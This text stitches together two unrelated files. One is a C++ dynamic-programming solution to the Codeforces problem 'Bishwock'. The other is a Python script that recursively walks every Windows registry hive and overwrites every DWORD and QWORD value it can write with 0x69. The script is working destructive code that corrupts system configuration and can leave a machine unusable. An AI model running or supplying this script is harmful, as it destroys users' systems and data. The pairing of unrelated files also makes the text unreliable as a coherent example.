// Problem: D. Bishwock
// Contest: Codeforces - Codeforces Round 491 (Div. 2)
// URL: https://codeforces.com/contest/991/problem/D
// Memory Limit: 256 MB
// Time Limit: 1000 ms
//
// Powered by CP Editor (https://cpeditor.org)

#include <assert.h>
#include <bits/stdc++.h>
using namespace std;
#ifndef __DEBUG__
#define dbg(...) 42
#endif
template <class T> using mpq = priority_queue<T, vector<T>, greater<T>>;

using ll = long long;
using pii = pair<int, int>;
using pll = pair<ll, ll>;
using vl = vector<ll>;
using vi = vector<int>;

int main(int argc, char **argv)
{
    int n;
    string s1, s2;
    cin >> s1 >> s2;
    n = s1.size();
    // 00 0, 0X 1, X0 2, XX 3
    using a4i = array<int, 4>;
    vector<a4i> dp(n + 1);
    dp[0] = {0, 0, 0, 1};
    for (int i = 0; i < n; ++i) {
        int state = (s1[i] == 'X' ? 2 : 0) + (s2[i] == 'X' ? 1 : 0);
        dp[i + 1][state] = max({dp[i][0], dp[i][1], dp[i][2], dp[i][3]});
        switch (state) {
            case 0:
                dp[i + 1][1] = max(dp[i + 1][1], dp[i][0] + 1);
                dp[i + 1][2] = max(dp[i + 1][2], dp[i][0] + 1);
                dp[i + 1][3] = max(dp[i + 1][3], max(dp[i][1], dp[i][2]) + 1);
                break;
            case 1:
                dp[i + 1][0] = dp[i + 1][2] = 0;
                dp[i + 1][3] = max(dp[i + 1][3], dp[i][0] + 1);
                break;
            case 2:
                dp[i + 1][0] = dp[i + 1][1] = 0;
                dp[i + 1][3] = max(dp[i + 1][3], dp[i][0] + 1);
                break;
            case 3:
                dp[i + 1][0] = dp[i + 1][1] = dp[i + 1][2] = 0;
                break;
        }
    }
    for (auto x : dp)
        dbg(x);
    cout << max({dp[n][0], dp[n][1], dp[n][2], dp[n][3]}) - 1 << endl;
    return 0;
};

# Andrew Maney 2022, file copied from https://gist.github.com/FlyTechVideos/2a9b260f0cd440fbe316241ffc8e48ac


# Imports
import winreg


# Variables
VALUE_TO_WRITE = 0x69


root_dict = {
    'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
    'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER,
    'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
    'HKEY_USERS': winreg.HKEY_USERS,
    'HKEY_CURRENT_CONFIG': winreg.HKEY_CURRENT_CONFIG
}


types_to_overwrite = [
    winreg.REG_DWORD,
    winreg.REG_QWORD
]


# Functions
def check_values(root, key, opened_key):
    values_to_overwrite = []
    try:
        i = 0
        while True:
            value = winreg.EnumValue(opened_key, i)
            if value[2] in types_to_overwrite:
                values_to_overwrite.append((value[0], value[2]))
            i += 1
    except:
        pass
    
    if len(values_to_overwrite) > 0:
        try:
            opened_write_key = winreg.OpenKey(root_dict[root], key, access=winreg.KEY_SET_VALUE)
            for value_pair in values_to_overwrite:
                winreg.SetValueEx(opened_write_key, value_pair[0], 0, int(value_pair[1]), VALUE_TO_WRITE)
        except Exception as e:
            print(f'PERMISSION DENIED: {e}')
            pass


def traverse(root, key):
    should_check_values = True
    try:
        opened_key = winreg.OpenKey(root_dict[root], key)
        check_values(root, key, opened_key)
    except Exception as e:
        if 'WinError 5' in str(e):
            print(f'{e}: Error 5 [no read permission]')
            should_check_values = False # no need if i can't read them anyway
    
    if should_check_values:
        check_values(root, key, opened_key)

    if key != '':
        key += '\\'
    try:
        i = 0
        while True:
            traverse(root, key + winreg.EnumKey(opened_key, i))
            i += 1
    except:
        pass


def main():
    for root in root_dict.keys():
        traverse(root, "")


if __name__ == '__main__':
    main()

